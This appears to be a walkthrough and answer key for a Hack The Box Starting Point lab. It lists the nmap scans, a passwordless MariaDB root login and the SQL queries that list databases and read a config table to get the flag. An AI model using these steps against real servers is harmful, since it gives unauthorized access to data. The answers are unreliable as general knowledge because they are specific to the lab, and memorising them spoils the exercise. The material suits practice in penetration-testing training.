# Link
- https://app.hackthebox.com/starting-point

# Questions

## During our scan, which port do we find serving MySQL?
- `nmap $IP`

## What community-developed MySQL version is the target running?
- `nmap $IP -p3306 -Pn -sV`

## When using the MySQL command line client, what switch do we need to use in order to specify a login username?
- `-u`

## Which username allows us to log into this MariaDB instance without providing a password?
- root

## In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
- '*'

## In SQL, what symbol do we need to end each query with?
- ';'

## There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

```bash
mysql -h $IP -u root

show databases;
```

## Submit root flag
```bash
use htb;

select * from config;
```